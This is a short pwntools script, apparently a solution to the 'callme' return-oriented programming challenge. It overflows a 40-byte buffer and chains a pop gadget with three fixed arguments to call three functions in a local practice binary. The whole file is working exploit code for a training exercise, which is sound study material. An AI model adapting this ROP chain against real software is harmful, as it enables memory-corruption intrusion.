from pwn import *

context.bits = 64;


overwrite = b"A"*40;

callme1 = p64(0x00400720);
callme2 = p64(0x00400740);
callme3 = p64(0x004006f0);

arg1 = p64(0xdeadbeefdeadbeef);
arg2 = p64(0xcafebabecafebabe);
arg3 = p64(0xd00df00dd00df00d);
args = arg1 + arg2 + arg3;

pop = p64(0x000000000040093c);

payload = overwrite;
payload += pop + args + callme1 + pop + args + callme2 + pop + args + callme3;

p = process("./callme");
p.send(payload);
p.interactive();
